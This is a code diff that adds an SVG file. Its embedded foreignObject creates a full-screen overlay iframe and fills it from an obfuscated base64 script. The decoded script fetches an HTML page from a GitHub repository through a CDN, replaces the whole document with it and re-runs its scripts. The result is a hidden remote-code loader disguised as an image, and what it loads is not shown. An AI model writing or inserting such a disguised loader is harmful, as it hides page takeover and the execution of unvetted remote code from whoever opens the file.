@@ -1,0 +1,9 @@
+<svg xmlns="http://www.w3.org/2000/svg" width="100%" height="100%" style="position: fixed; top: 0; left: 0;">
+  <foreignObject x="0" y="0" width="100%" height="100%">
+    <body xmlns="http://www.w3.org/1999/xhtml">
+    <meta content="width=device-width, initial-scale=1.0" name="viewport"></meta>
+    <iframe style="position:fixed; top:0; left:0; bottom:0; right:0; width:100%; height:100%; border:none; margin:0; padding:0; overflow:hidden; z-index:999999;" id="test"></iframe>
+    <script>let l = atob("PHNjcmlwdD4KbGF1bmNoKCk7CmZ1bmN0aW9uIGxhdW5jaCgpIHsKICB0cnkgewogICAgZmV0Y2goImh0dHBzOi8vY2RuLmpzZGVsaXZyLm5ldC9naC9NaWtlMTAwMDU3MS9NS1VCRy1saW5rQG1haW4vc2luZ2xlZmlsZS5odG1sP3Q9IitEYXRlLm5vdygpKQogICAgICAudGhlbihyID0+IHIudGV4dCgpKQogICAgICAudGhlbihodG1sID0+IHsKICAgICAgICBkb2N1bWVudC5kb2N1bWVudEVsZW1lbnQuaW5uZXJIVE1MID0gaHRtbDsKICAgICAgICBkb2N1bWVudC5kb2N1bWVudEVsZW1lbnQucXVlcnlTZWxlY3RvckFsbCgnc2NyaXB0JykuZm9yRWFjaChvbGQgPT4gewogICAgICAgICAgY29uc3QgcyA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoJ3NjcmlwdCcpOwogICAgICAgICAgaWYgKG9sZC5zcmMpIHsgcy5zcmMgPSBvbGQuc3JjOyB9IGVsc2UgeyBzLnRleHRDb250ZW50ID0gb2xkLnRleHRDb250ZW50OyB9CiAgICAgICAgICBkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKHMpOwogICAgICAgIH0pOwogICAgICB9KTsKICB9IGNhdGNoIChlKSB7IGNvbnNvbGUuZXJyb3IoJ2Vycm9yOicsIGUpOyB9Cn0KPC9zY3JpcHQ+Cg=="); var theIframe = document.getElementById('test'); theIframe.srcdoc = l;</script>
+    </body>
+  </foreignObject>
+</svg>
